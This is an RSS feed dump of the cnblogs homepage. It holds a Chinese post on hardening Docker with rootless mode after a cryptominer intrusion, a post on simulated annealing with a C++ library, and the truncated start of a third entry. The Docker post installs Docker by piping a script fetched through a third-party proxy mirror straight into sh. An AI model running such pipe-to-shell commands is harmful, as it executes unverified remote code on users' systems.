{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "从挖矿木马入侵到 Docker Rootless 加固，我的服务器安全复盘",
      "link": "https://www.cnblogs.com/deali/p/19626849",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/deali/p/19626849\" id=\"cb_post_title_url\" title=\"发布于 2026-02-20 20:45\">\n    <span>从挖矿木马入侵到 Docker Rootless 加固，我的服务器安全复盘</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"前言\">前言</h2>\n<p>最近我连续几台服务器被挂了挖矿木马，CPU、带宽、磁盘 IO 被拉满，服务器直接卡死无法连接。</p>\n<p>排查后发现，核心诱因是 Docker 权限过高 + 服务漏洞暴露，导致攻击者通过容器突破权限控制。</p>\n<p><img alt=\"\" src=\"https://blog.deali.cn/media/blog/cec878553480eb4f/1097027d157aa49e.jpg\" /></p>\n<blockquote>\n<p>PS：本来想写一篇文章介绍排查过程的，不过还是嫌麻烦没写，放在本文一起讲吧~</p>\n</blockquote>\n<p>重装系统后，我在部署 Docker 时注意到官方提示的 Rootless（无根）模式 —— 这一模式能从根本上降低容器逃逸风险，遂深入研究并落地配置，现将完整过程整理分享，希望能帮到同样关注 Docker 安全的开发者。</p>\n<h2 id=\"rootless-模式是什么\">Rootless 模式是什么</h2>\n<p>普通情况下，Docker 守护进程（dockerd）是用 <code>root</code> 权限运行的，哪怕你用普通用户执行 <code>docker run</code>，底层还是 root 权限，这有安全风险（比如容器逃逸可能拿到主机 root）。</p>\n<p>Rootless 模式让 Docker 守护进程以<strong>普通用户权限</strong>运行，哪怕容器出问题，也无法获取主机的 root 权限，安全性大幅提升。</p>\n<p>有好处自然有代价，rootless 的代价是配置复杂，且部分功能受限（比如无法端口映射 &lt; 1024）。</p>\n<p>不过没关系，这些也可以通过配置解决。先从安装开始吧。</p>\n<h2 id=\"安装docker\">安装docker</h2>\n<p>本来安装是很简单的，不过加个定语：在国内网络环境，那就非常复杂了。</p>\n<p>本文介绍最简单的安装方式：使用docker官方脚本+清华镜像。</p>\n<pre><code class=\"language-bash\">export DOWNLOAD_URL=\"https://mirrors.tuna.tsinghua.edu.cn/docker-ce\"\n# 如您使用 curl\ncurl -fsSL https://ghfast.top/https://raw.githubusercontent.com/docker/docker-install/master/install.sh | sh\n# 如您使用 wget\nwget -O- https://ghfast.top/https://raw.githubusercontent.com/docker/docker-install/master/install.sh | sh\n</code></pre>\n<p>注意 <code>raw.githubusercontent.com</code> 这个域名也是无法访问的，可以使用 ghproxy 来加速。</p>\n<h2 id=\"安装完成提示\">安装完成提示</h2>\n<p>安装完成会有一个提示，这也是开启 Rootless 模式的关键入口：</p>\n<pre><code class=\"language-bash\">================================================================================\n\nTo run Docker as a non-privileged user, consider setting up the\nDocker daemon in rootless mode for your user:\n\n    dockerd-rootless-setuptool.sh install\n\nVisit https://docs.docker.com/go/rootless/ to learn about rootless mode.\n\n\nTo run the Docker daemon as a fully privileged service, but granting non-root\nusers access, refer to https://docs.docker.com/go/daemon-access/\n\nWARNING: Access to the remote API on a privileged Docker daemon is equivalent\n         to root access on the host. Refer to the 'Docker daemon attack surface'\n         documentation for details: https://docs.docker.com/go/attack-surface/\n\n================================================================================\n</code></pre>\n<p>我就是在这里开始使用 rootless 模式的。</p>\n<p>提示核心解读：</p>\n<ol>\n<li>推荐通过<code>dockerd-rootless-setuptool.sh install</code>开启 Rootless 模式，让普通用户无 root 权限运行 Docker；</li>\n<li>若坚持 root 权限运行 Docker，可参考文档给普通用户授权（如加入 docker 组），但风险更高；</li>\n<li>重点警告：暴露 Docker 远程 API（如 2375 端口）= 直接开放主机 root 权限，这是服务器被入侵的高频诱因！</li>\n</ol>\n<h2 id=\"安装必要依赖\">安装必要依赖</h2>\n<p>我直接运行 <code>dockerd-rootless-setuptool.sh install</code> 的时候，提示要缺乏依赖</p>\n<pre><code class=\"language-bash\">$ dockerd-rootless-setuptool.sh install\n[ERROR] Missing system requirements. Run the following commands to\n[ERROR] install the requirements and run this tool again.\n\n########## BEGIN ##########\nsudo sh -eux &lt;&lt;EOF\n# Install newuidmap &amp; newgidmap binaries\napt-get install -y uidmap\nEOF\n########## END ##########\n</code></pre>\n<p>输入提示的这行命令：</p>\n<pre><code class=\"language-bash\">sudo sh -eux &lt;&lt;EOF\n# Install newuidmap &amp; newgidmap binaries\napt-get install -y uidmap\nEOF\n</code></pre>\n<p>安装完成后，再次执行 <code>dockerd-rootless-setuptool.sh install</code></p>\n<p>以后操作 docker 服务，要加上 <code>--user</code></p>\n<pre><code class=\"language-bash\">systemctl --user start docker.service\n</code></pre>\n<h2 id=\"配置\">配置</h2>\n<p>rootless 模式下：</p>\n<ul>\n<li>所有 Docker 命令都要在<strong>安装 Rootless 的普通用户</strong>下执行（不要用 root）；</li>\n<li>如果重启服务器后 Docker 没自动启动，执行：<code>systemctl --user enable --now docker</code>；</li>\n<li>数据备份要找 <code>~/.local/share/docker</code> 目录（而非 <code>/var/lib/docker</code>）。</li>\n</ul>\n<h3 id=\"镜像加速器\">镜像加速器</h3>\n<p>默认情况下，Rootless Docker 的配置文件存放在当前用户的 <strong>XDG 配置目录</strong> 下，路径是：<code>~/.config/docker/daemon.json</code></p>\n<pre><code class=\"language-bash\"># 先创建目录（如果不存在）\nmkdir -p ~/.config/docker\n\n# 编辑配置文件（用 nano 或 vim 都可以）\nnano ~/.config/docker/daemon.json\n</code></pre>\n<p>配置加速器</p>\n<pre><code class=\"language-json\">{\n  \"registry-mirrors\": [\"https://你的阿里云镜像加速地址.mirror.aliyuncs.com\"],\n  \"log-driver\": \"json-file\",\n  \"log-opts\": {\n    \"max-size\": \"100m\",\n    \"max-file\": \"3\"\n  }\n}\n</code></pre>\n<p>注意：之前大部分稳定好用的加速器都停止服务了，现在就没法推荐啥，大家各凭本事吧。</p>\n<h3 id=\"解决-无法绑定-1-1023-端口-的问题\">解决 “无法绑定 1-1023 端口” 的问题</h3>\n<p>需要给当前用户 “绑定低端口” 的权限：</p>\n<pre><code class=\"language-bash\"># 给当前用户授权绑定 1-1023 端口（仅对当前会话生效）\nsudo sysctl net.ipv4.ip_unprivileged_port_start=0\n\n# 永久生效（重启后也有效）\necho \"net.ipv4.ip_unprivileged_port_start=0\" | sudo tee -a /etc/sysctl.conf\nsudo sysctl -p  # 立即生效\n</code></pre>\n<p>执行后，你就能正常映射 80、443 等端口了。</p>\n<h3 id=\"重启生效\">重启生效</h3>\n<p>Rootless 模式的 Docker 重启命令和系统级不同，执行：</p>\n<pre><code class=\"language-bash\"># 重启当前用户的 Docker 服务\nsystemctl --user restart docker\n\n# 验证配置是否生效\ndocker info\n# 能在 \"Registry Mirrors\" 部分看到你配置的镜像加速地址就是成功的\n</code></pre>\n<p>正常输出示例：</p>\n<pre><code class=\"language-plaintext\">Rootless: true\nRegistry Mirrors:\n https://你的阿里云镜像加速地址.mirror.aliyuncs.com/\n</code></pre>\n<h3 id=\"rootless-模式不支持的配置项\">Rootless 模式不支持的配置项</h3>\n<p>部分系统级配置在 Rootless 下无效（因为没有 root 权限），比如：</p>\n<ul>\n<li><code>iptables: false</code>（网络规则由 slirp4netns 管理，而非 iptables）；</li>\n<li><code>storage-driver: overlay2</code>（默认已启用，无需手动配置）；</li>\n<li>远程 API 相关配置（如 <code>hosts: [\"tcp://0.0.0.0:2375\"]</code>，Rootless 下不建议开启）。</li>\n<li>任何涉及系统级目录（如<code>/var/run/docker.sock</code>）的配置。</li>\n</ul>\n<h2 id=\"volume问题\">volume问题</h2>\n<p>切换到 rootless 之后，我还发现了 swag 的 config 无法读写了。</p>\n<p>swag 的 compose.yaml 配置是这样：</p>\n<pre><code class=\"language-yaml\">services:\n  swag:\n    image: linuxserver/swag\n    container_name: swag\n    cap_add:\n      - NET_ADMIN\n    environment:\n      - PUID=1000\n      - PGID=1000\n    volumes:\n      - ./config:/config\n</code></pre>\n<p><strong>rootless Docker 里，容器内的 UID=1000 ≠ 宿主机的 UID=1000</strong></p>\n<p>所以 <strong>SWAG 在容器里 chown 了 <code>/config</code>，宿主机看到的是一个“映射后的陌生 UID（100999）”</strong></p>\n<h3 id=\"解决方法\">解决方法</h3>\n<p>rootless 官方推荐使用命名卷，但我要经常修改 config 里的文件，这个肯定不现实。</p>\n<p>那么还有一个方法，使用 ACL 放行。</p>\n<p>先安装相关工具：</p>\n<pre><code class=\"language-bash\">sudo apt update\nsudo apt install -y acl\n</code></pre>\n<p>在 swag 目录下执行</p>\n<pre><code class=\"language-bash\">setfacl -m u:ecs-user:rwx config\nsetfacl -R -m u:ecs-user:rwx config\nsetfacl -d -m u:ecs-user:rwx config\n</code></pre>\n<p>验证：</p>\n<pre><code class=\"language-bash\">getfacl config | sed -n '1,20p'\n</code></pre>\n<p>看到类似：</p>\n<pre><code>user::rwx\nuser:ecs-user:rwx\ngroup::r-x\nmask::rwx\nother::r-x\n</code></pre>\n<h2 id=\"小结\">小结</h2>\n<p>Rootless 模式虽比普通 Docker 配置稍繁琐，但能从根本上降低容器逃逸风险，尤其适合对外提供服务的生产服务器。核心总结：</p>\n<ol>\n<li>安装：结合清华镜像源解决国内下载问题，优先用普通用户安装 Rootless 模式；</li>\n<li>权限：禁止暴露 Docker 远程 API，给普通用户授权低端口绑定权限即可满足日常使用；</li>\n<li>配置：牢记 Rootless 模式的配置文件、数据目录均在用户目录下，与系统级 Docker 区分开；</li>\n<li>安全：即便开启 Rootless，运行容器时仍需注意服务安全（如 Redis 加密码、安全组限制端口访问）。</li>\n</ol>\n<p>此次踩坑让我深刻意识到：服务器安全无小事，哪怕是 Docker 这样的基础工具，也需从权限层面做好最小化管控，才能避免被挖矿木马等恶意程序趁虚而入。</p>\n\n\n</div>\n<div id=\"MySignature\">\n    微信公众号：「程序设计实验室」\n专注于互联网热门新技术探索与团队敏捷开发实践，包括架构设计、机器学习与数据分析算法、移动端开发、Linux、Web前后端开发等，欢迎一起探讨技术，分享学习实践经验。\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-20 20:45</span>&nbsp;\n<a href=\"https://www.cnblogs.com/deali\">程序设计实验室</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "模拟退火算法",
      "link": "https://www.cnblogs.com/PaperPlaneFly/p/19626799",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/PaperPlaneFly/p/19626799\" id=\"cb_post_title_url\" title=\"发布于 2026-02-20 20:14\">\n    <span>模拟退火算法</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"模拟退火算法\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220201320618-591678279.png\" />\n        模拟退火算法最早的思想由**Metropolis **等（** **1953** **）提出，** **1983** **年** **Kirkpatrick** **等将其应用于组合优化。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"模拟退火算法\">模拟退火算法</h1>\n<p>​    <strong>模拟退火算法最早的思想由</strong>Metropolis <strong>等（</strong> <strong>1953</strong> <strong>）提出，</strong> <strong>1983</strong> <strong>年</strong> <strong>Kirkpatrick</strong> <strong>等将其应用于组合优化。</strong></p>\n<p><strong>算法的目的</strong>：</p>\n<p><strong>克服优化过程陷入局部极小；</strong></p>\n<p><strong>克服初值依赖性。</strong></p>\n<h2 id=\"物理退火过程\">物理退火过程</h2>\n<p>在物理学中，<strong>退火</strong>是将金属加热到极高温度，然后让其<strong>极其缓慢</strong>地冷却的过程。</p>\n<ul>\n<li><strong>高温状态</strong>：原子运动剧烈，处于无序状态（高能量）。</li>\n<li><strong>等温过程</strong>  <strong>对于与环境换热而温度不变的封闭系统，系统状态的自发变化总是朝自由能减少的方向进行，当自由能达到最小时，系统达到平衡态；</strong></li>\n<li><strong>缓慢冷却</strong>：原子逐渐找到最稳定的位置，形成整齐的晶体结构。</li>\n<li><strong>最终状态</strong>：系统的<strong>内能最低</strong>（全局最优）。</li>\n</ul>\n<p>如果冷却得太快（<strong>淬火</strong>，Quenching），原子来不及调整位置就被“冻结”在杂乱的状态，系统处于亚稳态（局部最优，内能较高，材料脆）。</p>\n<p>温度越低，物体的能量状态越低，到达足够的低点时，液体开始冷凝与结晶，在结晶状态时，系统的能量状态最低。缓慢降温（退火时，可达到最低能量状态；但如果快速降温（淬火，会导致不是最低能态的非晶形。</p>\n<h2 id=\"boltzmann概率分布\"><strong>Boltzmann</strong>概率分布</h2>\n<p>在温度T，分子停留在状态r满足Boltzmann概率分布</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200000416-839968077.png\" /></p>\n<p><img alt=\"科学网—科学史-物理学编年史-80玻尔兹曼分布律 - 张延年的博文\" src=\"https://ts3.tc.mm.bing.net/th/id/OIP-C.F28T_kCjs5-MqGcOpdgA9wHaE1?rs=1&amp;pid=ImgDetMain&amp;o=7&amp;rm=3\" /></p>\n<p>在同一个温度T，选定两个能量E1&lt;E2，有</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200026317-2005365913.png\" /></p>\n<p><strong>（</strong>1<strong>）在同一个温度，分子停留在能量小状态的概率大于停留在能量大状态的概率</strong></p>\n<p><strong>（</strong>2<strong>）温度越高，不同能量状态对应的概率相差越小；温度足够高时，各状态对应概率基本相同。</strong></p>\n<p><strong>（</strong>3<strong>）随着温度的下降，能量最低状态对应概率越来越大；温度趋于</strong>0<strong>时，其状态趋于</strong>1</p>\n<h2 id=\"metropolis准则\"><strong>Metropolis</strong>准则</h2>\n<p><strong>以概率接受新状态</strong></p>\n<p>假设当前状态为 x，能量为 E(x)。</p>\n<p>我们随机生成了一个邻域新解 x'，能量为 E(x')。</p>\n<p>定义能量差为：</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200221455-1081080706.png\" /></p>\n<p>简单来说，它的核心数学思想是：<strong>以一定的概率接受一个“更差”的解，从而跳出局部最优陷阱，最终趋向全局最优。</strong></p>\n<h4 id=\"情况-a新解更好-δe0\">情况 A：新解更好 (Δ<em>E</em>&lt;0)</h4>\n<p>如果新解的能量更低（比如在下山），我们<strong>100% 接受</strong>这个新解。</p>\n<p><em>P</em>(accept)=1</p>\n<p>这对应了贪心算法（Gradient Descent）的部分。</p>\n<h4 id=\"情况-b新解更差-δe0\">情况 B：新解更差 (Δ<em>E</em>&gt;0)</h4>\n<p>如果新解的能量更高（比如要爬坡，反方向），我们<strong>不是直接拒绝</strong>，而是<strong>以一定的概率接受它</strong>。这个概率 <em>P</em> 服从 <strong>玻尔兹曼分布 (Boltzmann Distribution)</strong>：</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200357347-1971444950.png\" /></p>\n<ul>\n<li>\n<p>Δ<em>E</em>：能量差（肯定为正）。</p>\n</li>\n<li>\n<p><em>T</em>：当前的温度。</p>\n</li>\n<li>\n<p><em>k</em>：物理中的玻尔兹曼常数（在算法中通常设为 1）。</p>\n</li>\n</ul>\n<h4 id=\"1-温度-t-极高时-探索阶段\">(1) 温度 T 极高时 (探索阶段)</h4>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200411620-1794628474.png\" /></p>\n<p>接受概率接近 100%。哪怕新解比旧解差很多，算法也会接受。</p>\n<p>算法在搜索空间中<strong>随机游走 (Random Walk)</strong>，像个醉汉。这保证了它能翻越极高的山峰，从深坑里跳出来，遍历整个空间。</p>\n<h4 id=\"2-温度-t-降低时-过渡阶段\">(2) 温度 T 降低时 (过渡阶段)</h4>\n<p>随着 T 变小，分母变小，指数部分变成较大的负数。<br />\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200433875-1909155565.png\" /></p>\n<p>如果Delta E 很大（解变差很多），概率 P<span class=\"math inline\">\\(就会很小；如果 \\Delta E\\)</span>很小（只差一点点），概率 P$还比较大。</p>\n<p>算法开始变得挑剔。它仍然允许跳出浅坑（局部最优），但不再接受那些太离谱的差解。</p>\n<h4 id=\"3-温度-t-极低时-收敛阶段\">(3) 温度 T 极低时 (收敛阶段)</h4>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200452308-1356373863.png\" /></p>\n<p>接受更差解的概率几乎为 0。</p>\n<p>算法退化为<strong>贪心算法 (Hill Climbing)</strong>。它只接受好解，不再爬坡。这时候它应该已经落入了全局最优</p>\n<h2 id=\"降温系数\">降温系数</h2>\n<p>在每一个固定的温度 T下，算法进行多次迭代。这实际上是在生成一个马尔可夫链。 如果迭代次数足够多，系统会达到服从玻尔兹曼分布<strong>热平衡分布 (Stationary Distribution)</strong>。</p>\n<p>当 T缓慢下降时，概率分布图会变得越来越尖（Peaked），大部分概率密度会集中在全局最小值的附近。</p>\n<p>引入冷却系数：</p>\n<p><strong>数学上的最优降温 (对数冷却)</strong>： Geman 在 1984 年证明，如果降温速度足够慢，满足：<br />\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200507935-837856176.png\" /></p>\n<p>那么模拟退火以<strong>概率 1 收敛到全局最优解</strong>。 <em>缺点</em>：这个速度太慢了，慢到实际上无法使用（可能需要几百年）。</p>\n<p><strong>工程上的降温 (指数冷却)</strong>：<br />\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200518474-1965198914.png\" /></p>\n<p>这是对收敛速度和求解质量的折衷。虽然理论上不保证 100% 找到全局最优，但在有限时间内能找到“足够好”的解。</p>\n<h2 id=\"rosenbrock-函数验证\">Rosenbrock 函数验证</h2>\n<p>N 维 Rosenbrock 函数的通常定义如下：</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{x}) = \\sum_{i=1}^{N-1} [100 (x_{i+1} - x_i^2)^2 + (1 - x_i)^2]\n\\]</div><p></p><p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200541507-1548156741.png\" /></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3540252/202602/3540252-20260220200605031-939946155.png\" /></p>\n<h2 id=\"c库代码如下\">c++库代码如下</h2>\n<p>sa.hpp</p>\n<pre><code>#ifndef SA_SA_HPP\n#define SA_SA_HPP\n\n\n#include \"params.hpp\"\n#include \"policies.hpp\"\n#include \"detail/solver.hpp\"\n\nnamespace sa {\n\n\n    /**\n     * @brief 模拟退火通用求解函数\n     * * @tparam State 状态类型 (自动推导)\n     * @tparam EnergyFunc 能量函数类型 (自动推导)\n     * @tparam NeighborFunc 邻域函数类型 (可选)\n     * @tparam CoolingPolicy 降温策略 (可选)\n     * @tparam ConstraintPolicy 约束策略 (可选)\n     * * @param initial_state 初始状态值\n     * @param energy_func 能量函数句柄\n     * @param params 算法参数配置\n     * @param neighbor 邻域生成器实例\n     * @param cooling 降温器实例\n     * @param constraint 约束器实例\n     * @return std::pair&lt;State, double&gt; {最优状态, 最优能量值}\n     */\n    template&lt;\n            typename State,\n            typename EnergyFunc,\n            typename NeighborFunc = DefaultNeighbor&lt;State&gt;,\n            typename CoolingPolicy = ExponentialCooling,\n            typename ConstraintPolicy = std::nullptr_t\n    &gt;\n    auto solve(\n            const State&amp; initial_state,\n            EnergyFunc energy_func,\n            Params params = Params{},\n            NeighborFunc neighbor = NeighborFunc{},\n            CoolingPolicy cooling = CoolingPolicy{},\n            ConstraintPolicy constraint = ConstraintPolicy{}\n    ) {\n        using AcceptancePolicy = MetropolisAcceptance;\n\n        detail::Solver&lt;State, EnergyFunc, NeighborFunc, CoolingPolicy, AcceptancePolicy, ConstraintPolicy&gt;\n                solver(params, energy_func, neighbor, cooling, AcceptancePolicy{}, constraint);\n\n        return solver.solve(initial_state);\n    }\n\n} // namespace sa\n\n#endif // SA_SA_HPP\n</code></pre>\n<p>policies.hpp</p>\n<pre><code>#ifndef SA_POLICIES_HPP\n#define SA_POLICIES_HPP\n\n#include \"params.hpp\"\n#include \"detail/traits.hpp\"\n\n#include &lt;cmath&gt;\n#include &lt;random&gt;\n#include &lt;algorithm&gt;\n#include &lt;stdexcept&gt;\n#include &lt;vector&gt;\n\nnamespace sa {\n\n    // 默认降温策略\n    struct ExponentialCooling {\n        inline double operator()(double T, const Params&amp; p) const noexcept {\n            return T * p.alpha;\n        }\n    };\n\n\n    // 默认接受策略 (Metropolis 准则)\n    struct MetropolisAcceptance {\n        template&lt;typename RNG&gt;\n        bool operator()(double delta_E,\n                        double T,\n                        RNG&amp; rng,\n                        std::uniform_real_distribution&lt;double&gt;&amp; dist) const\n        {\n            if (delta_E &lt; 0.0) return true;\n            return std::exp(-delta_E / T) &gt; dist(rng);\n        }\n    };\n\n\n    // 默认连续邻域生成策略\n    template&lt;typename State&gt;\n    struct DefaultNeighbor {\n        double sigma = 1.0;\n\n        State operator()(const State&amp; current,\n                         double T,\n                         std::mt19937&amp; rng) const\n        {\n            if constexpr (std::is_arithmetic_v&lt;State&gt;) {\n                std::normal_distribution&lt;double&gt; dist(0.0, sigma * T);\n                return static_cast&lt;State&gt;(current + dist(rng));\n            }\n            else if constexpr (detail::is_std_vector_v&lt;State&gt;) {\n                using ValueType = typename State::value_type;\n                static_assert(std::is_arithmetic_v&lt;ValueType&gt;,\n                              \"vector value type must be arithmetic\");\n\n                std::normal_distribution&lt;double&gt; dist(0.0, sigma * T);\n                State candidate = current;\n                for (auto&amp; v : candidate)\n                    v = static_cast&lt;ValueType&gt;(v + dist(rng));\n                return candidate;\n            }\n            else {\n                static_assert(sizeof(State) == 0, \"No default neighbor for this State type\");\n                return current;\n            }\n        }\n    };\n\n\n    // 离散翻转邻域策略 (针对 vector&lt;bool&gt; 或 vector&lt;int&gt;)\n    template&lt;typename State&gt;\n    struct DiscreteFlipNeighbor {\n        State operator()(const State&amp; current,\n                         double T,\n                         std::mt19937&amp; rng) const\n        {\n            static_assert(detail::is_std_vector_v&lt;State&gt;, \"DiscreteFlipNeighbor requires std::vector\");\n            using ValueType = typename State::value_type;\n\n            static_assert(\n                    std::is_same_v&lt;ValueType, int&gt; || std::is_same_v&lt;ValueType, bool&gt;,\n                    \"DiscreteFlipNeighbor requires vector&lt;int&gt; or vector&lt;bool&gt;\"\n            );\n\n            State candidate = current;\n            std::uniform_int_distribution&lt;std::size_t&gt; dist(0, candidate.size() - 1);\n            std::size_t idx = dist(rng);\n\n            if constexpr (std::is_same_v&lt;ValueType, bool&gt;)\n                candidate[idx] = !candidate[idx];\n            else\n                candidate[idx] = 1 - candidate[idx];\n\n            return candidate;\n        }\n    };\n\n\n    // 边界约束策略 (Box Constraint)\n    template&lt;typename State&gt;\n    class BoxConstraintPolicy {\n    public:\n        using ValueType = std::conditional_t&lt;\n                std::is_arithmetic_v&lt;State&gt;,\n                State,\n                typename State::value_type&gt;;\n\n        BoxConstraintPolicy(ValueType lower, ValueType upper)\n                : lower_(lower), upper_(upper) {}\n\n        void apply(State&amp; state) const noexcept {\n            if constexpr (std::is_arithmetic_v&lt;State&gt;) {\n                state = std::clamp(state, lower_, upper_);\n            }\n            else {\n                for (auto&amp; v : state)\n                    v = std::clamp(v, lower_, upper_);\n            }\n        }\n\n    private:\n        ValueType lower_;\n        ValueType upper_;\n    };\n\n} // namespace sa\n\n#endif // SA_POLICIES_HPP\n</code></pre>\n<p>params.hpp</p>\n<pre><code>//\n// Created by 31007 on 2026/2/12.\n//\n\n#ifndef MATH_TYPES_HPP\n#define MATH_TYPES_HPP\n#include &lt;cstddef&gt;\n#include &lt;cstdint&gt;\nnamespace sa {\n    struct Params {\n        double      initial_temp     = 100.0;       // 初始温度\n        double      final_temp       = 1e-6;        // 终止温度\n        double      alpha            = 0.98;        // 降温系数\n        std::size_t iter_per_temp    = 100;         // 每个温度下的迭代次数\n        std::size_t max_total_iters  = 1'000'000;   // 最大总迭代次数 (防止死循环)\n        std::uint32_t seed           = 0;           // 随机种子 (0表示随机)\n    };\n\n} // namespace sa\n#endif //MATH_TYPES_HPP\n</code></pre>\n<p>solver.hpp</p>\n<pre><code>#ifndef SA_DETAIL_SOLVER_HPP\n#define SA_DETAIL_SOLVER_HPP\n\n#include \"../params.hpp\"\n#include &lt;random&gt;\n#include &lt;utility&gt;\n#include &lt;stdexcept&gt;\n\nnamespace sa::detail {\n\n    template&lt;\n            typename State,\n            typename EnergyFunc,\n            typename NeighborFunc,\n            typename CoolingPolicy,\n            typename AcceptancePolicy,\n            typename ConstraintPolicy\n    &gt;\n    class Solver {\n    public:\n        Solver(Params params,\n               EnergyFunc energy,\n               NeighborFunc neighbor,\n               CoolingPolicy cooling,\n               AcceptancePolicy acceptance,\n               ConstraintPolicy constraint)\n                : params_(params),\n                  energy_(energy),\n                  neighbor_(neighbor),\n                  cooling_(cooling),\n                  acceptance_(acceptance),\n                  constraint_(constraint),\n                  dist_(0.0, 1.0)\n        {\n            validate_params();\n\n            if (params_.seed == 0) {\n                std::random_device rd;\n                rng_ = std::mt19937(rd());\n            } else {\n                rng_ = std::mt19937(params_.seed);\n            }\n        }\n\n        std::pair&lt;State, double&gt; solve(const State&amp; initial_state) {\n            State current = initial_state;\n            double current_energy = energy_(current);\n\n            State best = current;\n            double best_energy = current_energy;\n\n            double T = params_.initial_temp;\n            std::size_t total_iters = 0;\n\n            while (T &gt; params_.final_temp &amp;&amp; total_iters &lt; params_.max_total_iters) {\n                for (std::size_t i = 0;\n                     i &lt; params_.iter_per_temp &amp;&amp; total_iters &lt; params_.max_total_iters;\n                     ++i, ++total_iters)\n                {\n                    State candidate = neighbor_(current, T, rng_);\n\n                    // 编译期判断是否存在约束策略\n                    if constexpr (!std::is_same_v&lt;ConstraintPolicy, std::nullptr_t&gt;) {\n                        constraint_.apply(candidate);\n                    }\n\n                    double candidate_energy = energy_(candidate);\n                    double delta = candidate_energy - current_energy;\n\n                    if (acceptance_(delta, T, rng_, dist_)) {\n                        current = std::move(candidate);\n                        current_energy = candidate_energy;\n\n                        if (current_energy &lt; best_energy) {\n                            best = current;\n                            best_energy = current_energy;\n                        }\n                    }\n                }\n                T = cooling_(T, params_);\n            }\n\n            return {std::move(best), best_energy};\n        }\n\n    private:\n        void validate_params() {\n            if (params_.initial_temp &lt;= 0.0) throw std::invalid_argument(\"initial_temp must be &gt; 0\");\n            if (params_.final_temp &lt;= 0.0) throw std::invalid_argument(\"final_temp must be &gt; 0\");\n            if (params_.alpha &lt;= 0.0 || params_.alpha &gt;= 1.0) throw std::invalid_argument(\"alpha must be in (0,1)\");\n            if (params_.iter_per_temp == 0) throw std::invalid_argument(\"iter_per_temp must be &gt; 0\");\n        }\n\n        Params params_;\n        EnergyFunc energy_;\n        NeighborFunc neighbor_;\n        CoolingPolicy cooling_;\n        AcceptancePolicy acceptance_;\n        ConstraintPolicy constraint_;\n\n        std::mt19937 rng_;\n        std::uniform_real_distribution&lt;double&gt; dist_;\n    };\n\n} // namespace sa::detail\n\n#endif // SA_DETAIL_SOLVER_HPP\n</code></pre>\n<p>traits.hpp</p>\n<pre><code>#ifndef SA_DETAIL_TRAITS_HPP\n#define SA_DETAIL_TRAITS_HPP\n\n#include &lt;vector&gt;\n#include &lt;type_traits&gt;\n\nnamespace sa::detail {\n\n    // 类型萃取：判断是否为 std::vector\n\n    template&lt;typename T&gt;\n    struct is_std_vector : std::false_type {};\n\n    template&lt;typename T, typename Alloc&gt;\n    struct is_std_vector&lt;std::vector&lt;T, Alloc&gt;&gt; : std::true_type {};\n\n    template&lt;typename T&gt;\n    inline constexpr bool is_std_vector_v = is_std_vector&lt;T&gt;::value;\n\n} // namespace sa::detail\n\n#endif // SA_DETAIL_TRAITS_HPP\n</code></pre>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-20 20:14</span>&nbsp;\n<a href=\"https://www.cnblogs.com/PaperPlaneFly\">纸飞机低空飞行</a>&nbsp;\n阅读(<span id=\"post_view_count\">1</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "手把手教你使用vscode开发stm32！",
      "link": "https://www.cnblogs.com/chenyouyuan/p/19626759",
      "published": "",
